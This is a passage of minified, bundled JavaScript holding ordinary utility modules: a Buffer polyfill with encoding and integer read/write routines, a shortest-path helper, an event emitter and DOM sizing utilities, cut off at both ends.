encoding: "+t);var n=0|p(e,t),r=a(n),i=r.write(e,t);return i!==n&&(r=r.slice(0,i)),r}(e,t);if(ArrayBuffer.isView(e))return u(e);if(null==e)throw TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+_typeof2(e));if(O(e,ArrayBuffer)||e&&O(e.buffer,ArrayBuffer))return function(e,t,n){if(t<0||e.byteLength<t)throw new RangeError('"offset" is outside of buffer bounds');if(e.byteLength<t+(n||0))throw new RangeError('"length" is outside of buffer bounds');var r;return(r=void 0===t&&void 0===n?new Uint8Array(e):void 0===n?new Uint8Array(e,t):new Uint8Array(e,t,n)).__proto__=o.prototype,r}(e,t,n);if("number"==typeof e)throw new TypeError('The "value" argument must not be of type number. Received type number');var r=e.valueOf&&e.valueOf();if(null!=r&&r!==e)return o.from(r,t,n);var i=function(e){if(o.isBuffer(e)){var t=0|d(e.length),n=a(t);return 0===n.length||e.copy(n,0,0,t),n}return void 0!==e.length?"number"!=typeof e.length||N(e.length)?a(0):u(e):"Buffer"===e.type&&Array.isArray(e.data)?u(e.data):void 0}(e);if(i)return i;if("undefined"!=typeof Symbol&&null!=Symbol.toPrimitive&&"function"==typeof e[Symbol.toPrimitive])return o.from(e[Symbol.toPrimitive]("string"),t,n);throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type "+_typeof2(e))}function l(e){if("number"!=typeof e)throw new TypeError('"size" argument must be of type number');if(e<0)throw new RangeError('The value "'+e+'" is invalid for option "size"')}function c(e){return l(e),a(e<0?0:0|d(e))}function u(e){for(var t=e.length<0?0:0|d(e.length),n=a(t),r=0;r<t;r+=1)n[r]=255&e[r];return n}function d(e){if(i<=e)throw new RangeError("Attempt to allocate Buffer larger than maximum size: 0x"+i.toString(16)+" bytes");return 0|e}function p(e,t){if(o.isBuffer(e))return e.length;if(ArrayBuffer.isView(e)||O(e,ArrayBuffer))return e.byteLength;if("string"!=typeof e)throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type '+_typeof2(e));var n=e.length,r=2<arguments.length&&!0===arguments[2];if(!r&&0===n)return 0;for(var i=!1;;)switch(t){case"ascii":case"latin1":case"binary":return n;case"utf8":case"utf-8":return I(e).length;case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return 2*n;case"hex":return n>>>1;case"base64":return F(e).length;default:if(i)return r?-1:I(e).length;t=(""+t).toLowerCase(),i=!0}}function h(e,t,n){var r=e[t];e[t]=e[n],e[n]=r}function f(e,t,n,r,i){if(0===e.length)return-1;if("string"==typeof n?(r=n,n=0):2147483647<n?n=2147483647:n<-2147483648&&(n=-2147483648),N(n=+n)&&(n=i?0:e.length-1),n<0&&(n=e.length+n),n>=e.length){if(i)return-1;n=e.length-1}else if(n<0){if(!i)return-1;n=0}if("string"==typeof t&&(t=o.from(t,r)),o.isBuffer(t))return 0===t.length?-1:A(e,t,n,r,i);if("number"==typeof t)return t&=255,"function"==typeof Uint8Array.prototype.indexOf?i?Uint8Array.prototype.indexOf.call(e,t,n):Uint8Array.prototype.lastIndexOf.call(e,t,n):A(e,[t],n,r,i);throw new TypeError("val must be string, number or Buffer")}function A(e,t,n,r,i){var a,o=1,s=e.length,l=t.length;if(void 0!==r&&("ucs2"===(r=String(r).toLowerCase())||"ucs-2"===r||"utf16le"===r||"utf-16le"===r)){if(e.length<2||t.length<2)return-1;s/=o=2,l/=2,n/=2}function c(e,t){return 1===o?e[t]:e.readUInt16BE(t*o)}if(i){var u=-1;for(a=n;a<s;a++)if(c(e,a)===c(t,-1===u?0:a-u)){if(-1===u&&(u=a),a-u+1===l)return u*o}else-1!==u&&(a-=a-u),u=-1}else for(s<n+l&&(n=s-l),a=n;0<=a;a--){for(var d=!0,p=0;p<l;p++)if(c(e,a+p)!==c(t,p)){d=!1;break}if(d)return a}return-1}function m(e,t,n,r){n=Number(n)||0;var i=e.length-n;r?i<(r=Number(r))&&(r=i):r=i;var a=t.length;a/2<r&&(r=a/2);for(var o=0;o<r;++o){var s=parseInt(t.substr(2*o,2),16);if(N(s))return o;e[n+o]=s}return o}function v(e,t,n,r){return L(function(e){for(var t=[],n=0;n<e.length;++n)t.push(255&e.charCodeAt(n));return t}(t),e,n,r)}function g(e,n,r){return 0===n&&r===e.length?t.fromByteArray(e):t.fromByteArray(e.slice(n,r))}function y(e,t,n){n=Math.min(e.length,n);for(var r=[],i=t;i<n;){var a,o,s,l,c=e[i],u=null,d=239<c?4:223<c?3:191<c?2:1;if(i+d<=n)switch(d){case 1:c<128&&(u=c);break;case 2:128==(192&(a=e[i+1]))&&127<(l=(31&c)<<6|63&a)&&(u=l);break;case 3:a=e[i+1],o=e[i+2],128==(192&a)&&128==(192&o)&&2047<(l=(15&c)<<12|(63&a)<<6|63&o)&&(l<55296||57343<l)&&(u=l);break;case 4:a=e[i+1],o=e[i+2],s=e[i+3],128==(192&a)&&128==(192&o)&&128==(192&s)&&65535<(l=(15&c)<<18|(63&a)<<12|(63&o)<<6|63&s)&&l<1114112&&(u=l)}null===u?(u=65533,d=1):65535<u&&(u-=65536,r.push(u>>>10&1023|55296),u=56320|1023&u),r.push(u),i+=d}return function(e){var t=e.length;if(t<=b)return String.fromCharCode.apply(String,e);for(var n="",r=0;r<t;)n+=String.fromCharCode.apply(String,e.slice(r,r+=b));return n}(r)}n.kMaxLength=i,!(o.TYPED_ARRAY_SUPPORT=function(){try{var e=new Uint8Array(1);return e.__proto__={__proto__:Uint8Array.prototype,foo:function(){return 42}},42===e.foo()}catch(e){return!1}}())&&"undefined"!=typeof console&&console.error,Object.defineProperty(o.prototype,"parent",{enumerable:!0,get:function(){if(o.isBuffer(this))return this.buffer}}),Object.defineProperty(o.prototype,"offset",{enumerable:!0,get:function(){if(o.isBuffer(this))return this.byteOffset}}),"undefined"!=typeof Symbol&&null!=Symbol.species&&o[Symbol.species]===o&&Object.defineProperty(o,Symbol.species,{value:null,configurable:!0,enumerable:!1,writable:!1}),o.poolSize=8192,o.from=function(e,t,n){return s(e,t,n)},o.prototype.__proto__=Uint8Array.prototype,o.__proto__=Uint8Array,o.alloc=function(e,t,n){return i=t,o=n,l(r=e),r<=0?a(r):void 0!==i?"string"==typeof o?a(r).fill(i,o):a(r).fill(i):a(r);var r,i,o},o.allocUnsafe=function(e){return c(e)},o.allocUnsafeSlow=function(e){return c(e)},o.isBuffer=function(e){return null!=e&&!0===e._isBuffer&&e!==o.prototype},o.compare=function(e,t){if(O(e,Uint8Array)&&(e=o.from(e,e.offset,e.byteLength)),O(t,Uint8Array)&&(t=o.from(t,t.offset,t.byteLength)),!o.isBuffer(e)||!o.isBuffer(t))throw new TypeError('The "buf1", "buf2" arguments must be one of type Buffer or Uint8Array');if(e===t)return 0;for(var n=e.length,r=t.length,i=0,a=Math.min(n,r);i<a;++i)if(e[i]!==t[i]){n=e[i],r=t[i];break}return n<r?-1:r<n?1:0},o.isEncoding=function(e){switch(String(e).toLowerCase()){case"hex":case"utf8":case"utf-8":case"ascii":case"latin1":case"binary":case"base64":case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return!0;default:return!1}},o.concat=function(e,t){if(!Array.isArray(e))throw new TypeError('"list" argument must be an Array of Buffers');if(0===e.length)return o.alloc(0);var n;if(void 0===t)for(n=t=0;n<e.length;++n)t+=e[n].length;var r=o.allocUnsafe(t),i=0;for(n=0;n<e.length;++n){var a=e[n];if(O(a,Uint8Array)&&(a=o.from(a)),!o.isBuffer(a))throw new TypeError('"list" argument must be an Array of Buffers');a.copy(r,i),i+=a.length}return r},o.byteLength=p,o.prototype._isBuffer=!0,o.prototype.swap16=function(){var e=this.length;if(e%2!=0)throw new RangeError("Buffer size must be a multiple of 16-bits");for(var t=0;t<e;t+=2)h(this,t,t+1);return this},o.prototype.swap32=function(){var e=this.length;if(e%4!=0)throw new RangeError("Buffer size must be a multiple of 32-bits");for(var t=0;t<e;t+=4)h(this,t,t+3),h(this,t+1,t+2);return this},o.prototype.swap64=function(){var e=this.length;if(e%8!=0)throw new RangeError("Buffer size must be a multiple of 64-bits");for(var t=0;t<e;t+=8)h(this,t,t+7),h(this,t+1,t+6),h(this,t+2,t+5),h(this,t+3,t+4);return this},o.prototype.toLocaleString=o.prototype.toString=function(){var e=this.length;return 0===e?"":0===arguments.length?y(this,0,e):function(e,t,n){var r=!1;if((void 0===t||t<0)&&(t=0),t>this.length)return"";if((void 0===n||n>this.length)&&(n=this.length),n<=0)return"";if((n>>>=0)<=(t>>>=0))return"";for(e||(e="utf8");;)switch(e){case"hex":return C(this,t,n);case"utf8":case"utf-8":return y(this,t,n);case"ascii":return _(this,t,n);case"latin1":case"binary":return w(this,t,n);case"base64":return g(this,t,n);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return x(this,t,n);default:if(r)throw new TypeError("Unknown encoding: "+e);e=(e+"").toLowerCase(),r=!0}}.apply(this,arguments)},o.prototype.equals=function(e){if(!o.isBuffer(e))throw new TypeError("Argument must be a Buffer");return this===e||0===o.compare(this,e)},o.prototype.inspect=function(){var e="",t=n.INSPECT_MAX_BYTES;return e=this.toString("hex",0,t).replace(/(.{2})/g,"$1 ").trim(),this.length>t&&(e+=" ... "),"<Buffer "+e+">"},o.prototype.compare=function(e,t,n,r,i){if(O(e,Uint8Array)&&(e=o.from(e,e.offset,e.byteLength)),!o.isBuffer(e))throw new TypeError('The "target" argument must be one of type Buffer or Uint8Array. Received type '+_typeof2(e));if(void 0===t&&(t=0),void 0===n&&(n=e?e.length:0),void 0===r&&(r=0),void 0===i&&(i=this.length),t<0||n>e.length||r<0||i>this.length)throw new RangeError("out of range index");if(i<=r&&n<=t)return 0;if(i<=r)return-1;if(n<=t)return 1;if(this===e)return 0;for(var a=(i>>>=0)-(r>>>=0),s=(n>>>=0)-(t>>>=0),l=Math.min(a,s),c=this.slice(r,i),u=e.slice(t,n),d=0;d<l;++d)if(c[d]!==u[d]){a=c[d],s=u[d];break}return a<s?-1:s<a?1:0},o.prototype.includes=function(e,t,n){return-1!==this.indexOf(e,t,n)},o.prototype.indexOf=function(e,t,n){return f(this,e,t,n,!0)},o.prototype.lastIndexOf=function(e,t,n){return f(this,e,t,n,!1)},o.prototype.write=function(e,t,n,r){if(void 0===t)r="utf8",n=this.length,t=0;else if(void 0===n&&"string"==typeof t)r=t,n=this.length,t=0;else{if(!isFinite(t))throw new Error("Buffer.write(string, encoding, offset[, length]) is no longer supported");t>>>=0,isFinite(n)?(n>>>=0,void 0===r&&(r="utf8")):(r=n,n=void 0)}var i=this.length-t;if((void 0===n||i<n)&&(n=i),0<e.length&&(n<0||t<0)||t>this.length)throw new RangeError("Attempt to write outside buffer bounds");r||(r="utf8");for(var a,o,s,l,c,u,d=!1;;)switch(r){case"hex":return m(this,e,t,n);case"utf8":case"utf-8":return c=t,u=n,L(I(e,this.length-c),this,c,u);case"ascii":return v(this,e,t,n);case"latin1":case"binary":return v(this,e,t,n);case"base64":return this,s=t,l=n,L(F(e),this,s,l);case"ucs2":case"ucs-2":case"utf16le":case"utf-16le":return a=t,o=n,L(function(e,t){for(var n,r,i,a=[],o=0;o<e.length&&!((t-=2)<0);++o)r=(n=e.charCodeAt(o))>>8,i=n%256,a.push(i),a.push(r);return a}(e,this.length-a),this,a,o);default:if(d)throw new TypeError("Unknown encoding: "+r);r=(""+r).toLowerCase(),d=!0}},o.prototype.toJSON=function(){return{type:"Buffer",data:Array.prototype.slice.call(this._arr||this,0)}};var b=4096;function _(e,t,n){var r="";n=Math.min(e.length,n);for(var i=t;i<n;++i)r+=String.fromCharCode(127&e[i]);return r}function w(e,t,n){var r="";n=Math.min(e.length,n);for(var i=t;i<n;++i)r+=String.fromCharCode(e[i]);return r}function C(e,t,n){var r=e.length;(!t||t<0)&&(t=0),(!n||n<0||r<n)&&(n=r);for(var i="",a=t;a<n;++a)i+=P(e[a]);return i}function x(e,t,n){for(var r=e.slice(t,n),i="",a=0;a<r.length;a+=2)i+=String.fromCharCode(r[a]+256*r[a+1]);return i}function S(e,t,n){if(e%1!=0||e<0)throw new RangeError("offset is not uint");if(n<e+t)throw new RangeError("Trying to access beyond buffer length")}function k(e,t,n,r,i,a){if(!o.isBuffer(e))throw new TypeError('"buffer" argument must be a Buffer instance');if(i<t||t<a)throw new RangeError('"value" argument is out of bounds');if(n+r>e.length)throw new RangeError("Index out of range")}function M(e,t,n,r,i,a){if(n+r>e.length)throw new RangeError("Index out of range");if(n<0)throw new RangeError("Index out of range")}function B(e,t,n,i,a){return t=+t,n>>>=0,a||M(e,0,n,4),r.write(e,t,n,i,23,4),n+4}function E(e,t,n,i,a){return t=+t,n>>>=0,a||M(e,0,n,8),r.write(e,t,n,i,52,8),n+8}o.prototype.slice=function(e,t){var n=this.length;(e=~~e)<0?(e+=n)<0&&(e=0):n<e&&(e=n),(t=void 0===t?n:~~t)<0?(t+=n)<0&&(t=0):n<t&&(t=n),t<e&&(t=e);var r=this.subarray(e,t);return r.__proto__=o.prototype,r},o.prototype.readUIntLE=function(e,t,n){e>>>=0,t>>>=0,n||S(e,t,this.length);for(var r=this[e],i=1,a=0;++a<t&&(i*=256);)r+=this[e+a]*i;return r},o.prototype.readUIntBE=function(e,t,n){e>>>=0,t>>>=0,n||S(e,t,this.length);for(var r=this[e+--t],i=1;0<t&&(i*=256);)r+=this[e+--t]*i;return r},o.prototype.readUInt8=function(e,t){return e>>>=0,t||S(e,1,this.length),this[e]},o.prototype.readUInt16LE=function(e,t){return e>>>=0,t||S(e,2,this.length),this[e]|this[e+1]<<8},o.prototype.readUInt16BE=function(e,t){return e>>>=0,t||S(e,2,this.length),this[e]<<8|this[e+1]},o.prototype.readUInt32LE=function(e,t){return e>>>=0,t||S(e,4,this.length),(this[e]|this[e+1]<<8|this[e+2]<<16)+16777216*this[e+3]},o.prototype.readUInt32BE=function(e,t){return e>>>=0,t||S(e,4,this.length),16777216*this[e]+(this[e+1]<<16|this[e+2]<<8|this[e+3])},o.prototype.readIntLE=function(e,t,n){e>>>=0,t>>>=0,n||S(e,t,this.length);for(var r=this[e],i=1,a=0;++a<t&&(i*=256);)r+=this[e+a]*i;return(i*=128)<=r&&(r-=Math.pow(2,8*t)),r},o.prototype.readIntBE=function(e,t,n){e>>>=0,t>>>=0,n||S(e,t,this.length);for(var r=t,i=1,a=this[e+--r];0<r&&(i*=256);)a+=this[e+--r]*i;return(i*=128)<=a&&(a-=Math.pow(2,8*t)),a},o.prototype.readInt8=function(e,t){return e>>>=0,t||S(e,1,this.length),128&this[e]?-1*(255-this[e]+1):this[e]},o.prototype.readInt16LE=function(e,t){e>>>=0,t||S(e,2,this.length);var n=this[e]|this[e+1]<<8;return 32768&n?4294901760|n:n},o.prototype.readInt16BE=function(e,t){e>>>=0,t||S(e,2,this.length);var n=this[e+1]|this[e]<<8;return 32768&n?4294901760|n:n},o.prototype.readInt32LE=function(e,t){return e>>>=0,t||S(e,4,this.length),this[e]|this[e+1]<<8|this[e+2]<<16|this[e+3]<<24},o.prototype.readInt32BE=function(e,t){return e>>>=0,t||S(e,4,this.length),this[e]<<24|this[e+1]<<16|this[e+2]<<8|this[e+3]},o.prototype.readFloatLE=function(e,t){return e>>>=0,t||S(e,4,this.length),r.read(this,e,!0,23,4)},o.prototype.readFloatBE=function(e,t){return e>>>=0,t||S(e,4,this.length),r.read(this,e,!1,23,4)},o.prototype.readDoubleLE=function(e,t){return e>>>=0,t||S(e,8,this.length),r.read(this,e,!0,52,8)},o.prototype.readDoubleBE=function(e,t){return e>>>=0,t||S(e,8,this.length),r.read(this,e,!1,52,8)},o.prototype.writeUIntLE=function(e,t,n,r){e=+e,t>>>=0,n>>>=0,r||k(this,e,t,n,Math.pow(2,8*n)-1,0);var i=1,a=0;for(this[t]=255&e;++a<n&&(i*=256);)this[t+a]=e/i&255;return t+n},o.prototype.writeUIntBE=function(e,t,n,r){e=+e,t>>>=0,n>>>=0,r||k(this,e,t,n,Math.pow(2,8*n)-1,0);var i=n-1,a=1;for(this[t+i]=255&e;0<=--i&&(a*=256);)this[t+i]=e/a&255;return t+n},o.prototype.writeUInt8=function(e,t,n){return e=+e,t>>>=0,n||k(this,e,t,1,255,0),this[t]=255&e,t+1},o.prototype.writeUInt16LE=function(e,t,n){return e=+e,t>>>=0,n||k(this,e,t,2,65535,0),this[t]=255&e,this[t+1]=e>>>8,t+2},o.prototype.writeUInt16BE=function(e,t,n){return e=+e,t>>>=0,n||k(this,e,t,2,65535,0),this[t]=e>>>8,this[t+1]=255&e,t+2},o.prototype.writeUInt32LE=function(e,t,n){return e=+e,t>>>=0,n||k(this,e,t,4,4294967295,0),this[t+3]=e>>>24,this[t+2]=e>>>16,this[t+1]=e>>>8,this[t]=255&e,t+4},o.prototype.writeUInt32BE=function(e,t,n){return e=+e,t>>>=0,n||k(this,e,t,4,4294967295,0),this[t]=e>>>24,this[t+1]=e>>>16,this[t+2]=e>>>8,this[t+3]=255&e,t+4},o.prototype.writeIntLE=function(e,t,n,r){if(e=+e,t>>>=0,!r){var i=Math.pow(2,8*n-1);k(this,e,t,n,i-1,-i)}var a=0,o=1,s=0;for(this[t]=255&e;++a<n&&(o*=256);)e<0&&0===s&&0!==this[t+a-1]&&(s=1),this[t+a]=(e/o>>0)-s&255;return t+n},o.prototype.writeIntBE=function(e,t,n,r){if(e=+e,t>>>=0,!r){var i=Math.pow(2,8*n-1);k(this,e,t,n,i-1,-i)}var a=n-1,o=1,s=0;for(this[t+a]=255&e;0<=--a&&(o*=256);)e<0&&0===s&&0!==this[t+a+1]&&(s=1),this[t+a]=(e/o>>0)-s&255;return t+n},o.prototype.writeInt8=function(e,t,n){return e=+e,t>>>=0,n||k(this,e,t,1,127,-128),e<0&&(e=255+e+1),this[t]=255&e,t+1},o.prototype.writeInt16LE=function(e,t,n){return e=+e,t>>>=0,n||k(this,e,t,2,32767,-32768),this[t]=255&e,this[t+1]=e>>>8,t+2},o.prototype.writeInt16BE=function(e,t,n){return e=+e,t>>>=0,n||k(this,e,t,2,32767,-32768),this[t]=e>>>8,this[t+1]=255&e,t+2},o.prototype.writeInt32LE=function(e,t,n){return e=+e,t>>>=0,n||k(this,e,t,4,2147483647,-2147483648),this[t]=255&e,this[t+1]=e>>>8,this[t+2]=e>>>16,this[t+3]=e>>>24,t+4},o.prototype.writeInt32BE=function(e,t,n){return e=+e,t>>>=0,n||k(this,e,t,4,2147483647,-2147483648),e<0&&(e=4294967295+e+1),this[t]=e>>>24,this[t+1]=e>>>16,this[t+2]=e>>>8,this[t+3]=255&e,t+4},o.prototype.writeFloatLE=function(e,t,n){return B(this,e,t,!0,n)},o.prototype.writeFloatBE=function(e,t,n){return B(this,e,t,!1,n)},o.prototype.writeDoubleLE=function(e,t,n){return E(this,e,t,!0,n)},o.prototype.writeDoubleBE=function(e,t,n){return E(this,e,t,!1,n)},o.prototype.copy=function(e,t,n,r){if(!o.isBuffer(e))throw new TypeError("argument should be a Buffer");if(n||(n=0),r||0===r||(r=this.length),t>=e.length&&(t=e.length),t||(t=0),0<r&&r<n&&(r=n),r===n)return 0;if(0===e.length||0===this.length)return 0;if(t<0)throw new RangeError("targetStart out of bounds");if(n<0||n>=this.length)throw new RangeError("Index out of range");if(r<0)throw new RangeError("sourceEnd out of bounds");r>this.length&&(r=this.length),e.length-t<r-n&&(r=e.length-t+n);var i=r-n;if(this===e&&"function"==typeof Uint8Array.prototype.copyWithin)this.copyWithin(t,n,r);else if(this===e&&n<t&&t<r)for(var a=i-1;0<=a;--a)e[a+t]=this[a+n];else Uint8Array.prototype.set.call(e,this.subarray(n,r),t);return i},o.prototype.fill=function(e,t,n,r){if("string"==typeof e){if("string"==typeof t?(r=t,t=0,n=this.length):"string"==typeof n&&(r=n,n=this.length),void 0!==r&&"string"!=typeof r)throw new TypeError("encoding must be a string");if("string"==typeof r&&!o.isEncoding(r))throw new TypeError("Unknown encoding: "+r);if(1===e.length){var i=e.charCodeAt(0);("utf8"===r&&i<128||"latin1"===r)&&(e=i)}}else"number"==typeof e&&(e&=255);if(t<0||this.length<t||this.length<n)throw new RangeError("Out of range index");if(n<=t)return this;var a;if(t>>>=0,n=void 0===n?this.length:n>>>0,e||(e=0),"number"==typeof e)for(a=t;a<n;++a)this[a]=e;else{var s=o.isBuffer(e)?e:o.from(e,r),l=s.length;if(0===l)throw new TypeError('The value "'+e+'" is invalid for argument "value"');for(a=0;a<n-t;++a)this[a+t]=s[a%l]}return this};var T=/[^+/0-9A-Za-z-_]/g;function P(e){return e<16?"0"+e.toString(16):e.toString(16)}function I(e,t){var n;t=t||1/0;for(var r=e.length,i=null,a=[],o=0;o<r;++o){if(55295<(n=e.charCodeAt(o))&&n<57344){if(!i){if(56319<n){-1<(t-=3)&&a.push(239,191,189);continue}if(o+1===r){-1<(t-=3)&&a.push(239,191,189);continue}i=n;continue}if(n<56320){-1<(t-=3)&&a.push(239,191,189),i=n;continue}n=65536+(i-55296<<10|n-56320)}else i&&-1<(t-=3)&&a.push(239,191,189);if(i=null,n<128){if((t-=1)<0)break;a.push(n)}else if(n<2048){if((t-=2)<0)break;a.push(n>>6|192,63&n|128)}else if(n<65536){if((t-=3)<0)break;a.push(n>>12|224,n>>6&63|128,63&n|128)}else{if(!(n<1114112))throw new Error("Invalid code point");if((t-=4)<0)break;a.push(n>>18|240,n>>12&63|128,n>>6&63|128,63&n|128)}}return a}function F(e){return t.toByteArray(function(e){if((e=(e=e.split("=")[0]).trim().replace(T,"")).length<2)return"";for(;e.length%4!=0;)e+="=";return e}(e))}function L(e,t,n,r){for(var i=0;i<r&&!(i+n>=t.length||i>=e.length);++i)t[i+n]=e[i];return i}function O(e,t){return e instanceof t||null!=e&&null!=e.constructor&&null!=e.constructor.name&&e.constructor.name===t.name}function N(e){return e!=e}}).call(this)}).call(this,e("buffer").Buffer)},{"base64-js":34,buffer:35,ieee754:44}],36:[function(e,t,n){var r,i;r=window,i=function(){var e=function(){var e=window.Element.prototype;if(e.matches)return"matches";if(e.matchesSelector)return"matchesSelector";for(var t=["webkit","moz","ms","o"],n=0;n<t.length;n++){var r=t[n]+"MatchesSelector";if(e[r])return r}}();return function(t,n){return t[e](n)}},"function"==typeof define&&define.amd?define(i):"object"==_typeof2(t)&&t.exports?t.exports=i():r.matchesSelector=i()},{}],37:[function(e,t,n){var r={single_source_shortest_paths:function(e,t,n){var i={},a={};a[t]=0;var o,s,l,c,u,d,p,h=r.PriorityQueue.make();for(h.push(t,0);!h.empty();)for(l in s=(o=h.pop()).value,c=o.cost,u=e[s]||{})u.hasOwnProperty(l)&&(d=c+u[l],p=a[l],(void 0===a[l]||d<p)&&(a[l]=d,h.push(l,d),i[l]=s));if(void 0===n||void 0!==a[n])return i;var f=["Could not find a path from ",t," to ",n,"."].join("");throw new Error(f)},extract_shortest_path_from_predecessor_list:function(e,t){for(var n=[],r=t;r;)n.push(r),e[r],r=e[r];return n.reverse(),n},find_path:function(e,t,n){var i=r.single_source_shortest_paths(e,t,n);return r.extract_shortest_path_from_predecessor_list(i,n)},PriorityQueue:{make:function(e){var t,n=r.PriorityQueue,i={};for(t in e=e||{},n)n.hasOwnProperty(t)&&(i[t]=n[t]);return i.queue=[],i.sorter=e.sorter||n.default_sorter,i},default_sorter:function(e,t){return e.cost-t.cost},push:function(e,t){var n={value:e,cost:t};this.queue.push(n),this.queue.sort(this.sorter)},pop:function(){return this.queue.shift()},empty:function(){return 0===this.queue.length}}};void 0!==t&&(t.exports=r)},{}],38:[function(e,t,n){t.exports=function(e){for(var t=[],n=e.length,r=0;r<n;r++){var i=e.charCodeAt(r);if(55296<=i&&i<=56319&&r+1<n){var a=e.charCodeAt(r+1);56320<=a&&a<=57343&&(i=1024*(i-55296)+a-56320+65536,r+=1)}i<128?t.push(i):i<2048?(t.push(i>>6|192),t.push(63&i|128)):i<55296||57344<=i&&i<65536?(t.push(i>>12|224),t.push(i>>6&63|128),t.push(63&i|128)):65536<=i&&i<=1114111?(t.push(i>>18|240),t.push(i>>12&63|128),t.push(i>>6&63|128),t.push(63&i|128)):t.push(239,191,189)}return new Uint8Array(t).buffer}},{}],39:[function(e,t,n){var r,i;r="undefined"!=typeof window?window:this,i=function(){function e(){}var t=e.prototype;return t.on=function(e,t){if(e&&t){var n=this._events=this._events||{},r=n[e]=n[e]||[];return-1==r.indexOf(t)&&r.push(t),this}},t.once=function(e,t){if(e&&t){this.on(e,t);var n=this._onceEvents=this._onceEvents||{};return(n[e]=n[e]||{})[t]=!0,this}},t.off=function(e,t){var n=this._events&&this._events[e];if(n&&n.length){var r=n.indexOf(t);return-1!=r&&n.splice(r,1),this}},t.emitEvent=function(e,t){var n=this._events&&this._events[e];if(n&&n.length){n=n.slice(0),t=t||[];for(var r=this._onceEvents&&this._onceEvents[e],i=0;i<n.length;i++){var a=n[i];r&&r[a]&&(this.off(e,a),delete r[a]),a.apply(this,t)}return this}},t.allOff=function(){delete this._events,delete this._onceEvents},e},"function"==typeof define&&define.amd?define(i):"object"==_typeof2(t)&&t.exports?t.exports=i():r.EvEmitter=i()},{}],40:[function(e,t,n){var r,i;r=window,i=function(e,t){var n={extend:function(e,t){for(var n in t)e[n]=t[n];return e},modulo:function(e,t){return(e%t+t)%t}},r=Array.prototype.slice;n.makeArray=function(e){return Array.isArray(e)?e:null==e?[]:"object"==_typeof2(e)&&"number"==typeof e.length?r.call(e):[e]},n.removeFrom=function(e,t){var n=e.indexOf(t);-1!=n&&e.splice(n,1)},n.getParent=function(e,n){for(;e.parentNode&&e!=document.body;)if(e=e.parentNode,t(e,n))return e},n.getQueryElement=function(e){return"string"==typeof e?document.querySelector(e):e},n.handleEvent=function(e){var t="on"+e.type;this[t]&&this[t](e)},n.filterFindElements=function(e,r){e=n.makeArray(e);var i=[];return e.forEach((function(e){if(e instanceof HTMLElement)if(r){t(e,r)&&i.push(e);for(var n=e.querySelectorAll(r),a=0;a<n.length;a++)i.push(n[a])}else i.push(e)})),i},n.debounceMethod=function(e,t,n){n=n||100;var r=e.prototype[t],i=t+"Timeout";e.prototype[t]=function(){var e=this[i];clearTimeout(e);var t=arguments,a=this;this[i]=setTimeout((function(){r.apply(a,t),delete a[i]}),n)}},n.docReady=function(e){var t=document.readyState;"complete"==t||"interactive"==t?setTimeout(e):document.addEventListener("DOMContentLoaded",e)},n.toDashed=function(e){return e.replace(/(.)([A-Z])/g,(function(e,t,n){return t+"-"+n})).toLowerCase()};var i=e.console;return n.htmlInit=function(t,r){n.docReady((function(){var a=n.toDashed(r),o="data-"+a,s=document.querySelectorAll("["+o+"]"),l=document.querySelectorAll(".js-"+a),c=n.makeArray(s).concat(n.makeArray(l)),u=o+"-options",d=e.jQuery;c.forEach((function(e){var n,a=e.getAttribute(o)||e.getAttribute(u);try{n=a&&JSON.parse(a)}catch(n){return void(i&&i.error("Error parsing "+o+" on "+e.className+": "+n))}var s=new t(e,n);d&&d.data(e,r,s)}))}))},n},"function"==typeof define&&define.amd?define(["desandro-matches-selector/matches-selector"],(function(e){return i(r,e)})):"object"==_typeof2(t)&&t.exports?t.exports=i(r,e("desandro-matches-selector")):r.fizzyUIUtils=i(r,r.matchesSelector)},{"desandro-matches-selector":36}],41:[function(e,t,n){var r,i;r=window,i=function(){function e(e){var t=parseFloat(e);return-1==e.indexOf("%")&&!isNaN(t)&&t}var t="undefined"==typeof console?function(){}:function(e){},n=["paddingLeft","paddingRight","paddingTop","paddingBottom","marginLeft","marginRight","marginTop","marginBottom","borderLeftWidth","borderRightWidth","borderTopWidth","borderBottomWidth"],r=n.length;function i(e){var n=getComputedStyle(e);return n||t("Style returned "+n+". Are you running this code in a hidden iframe on Firefox? See https://bit.ly/getsizebug1"),n}var a,o=!1;return function t(s){if(function(){if(!o){o=!0;var n=document.createElement("div");n.style.width="200px",n.style.padding="1px 2px 3px 4px",n.style.borderStyle="solid",n.style.borderWidth="1px 2px 3px 4px",n.style.boxSizing="border-box";var r=document.body||document.documentElement;r.appendChild(n);var s=i(n);a=200==Math.round(e(s.width)),t.isBoxSizeOuter=a,r.removeChild(n)}}(),"string"==typeof s&&(s=document.querySelector(s)),s&&"object"==_typeof2(s)&&s.nodeType){var l=i(s);if("none"==l.display)return function(){for(var e={width:0,height:0,innerWidth:0,innerHeight:0,outerWidth:0,outerHeight:0},t=0;t<r;t++)e[n[t]]=0;return e}();var c={};c.width=s.offsetWidth,c.height=s.offsetHeight;for(var u=c.isBorderBox="border-box"==l.boxSizing,d=0;d<r;d++){var p=n[d],h=l[p],f=parseFloat(h);c[p]=isNaN(f)?0:f}var A=c.paddingLeft+c.paddingRight,m=c.paddingTop+c.paddingBottom,v=c.marginLeft+c.marginRight,g=c.marginTop+c.marginBottom,y=c.borderLeftWidth+c.borderRightWidth,b=c.borderTopWidth+c.borderBottomWidth,_=u&&a,w=e(l.width);!1!==w&&(c.width=w+(_?0:A+y));var C=e(l.height);return!1!==C&&(c.height=C+(_?0:m+b)),c.innerWidth=c.width-(A+y),c.innerHeight=c.height-(m+b),c.outerWidth=c.width+v,c.outerHeight=c.height+g,c}}},"function"==typeof define&&define.amd?define(i):"object"==_typeof2(t)&&t.exports?t.exports=i():r.getSize=i()},{}],42:[function(e,t,n){var r,i;r=this,i=function(e){function t(e,t){e.prototype=Object.create(t.prototype),(e.prototype.constructor=e).__proto__=t}function n(e){if(void 0===e)throw new ReferenceError("this hasn't been initialised - super() hasn't been called");return e}var 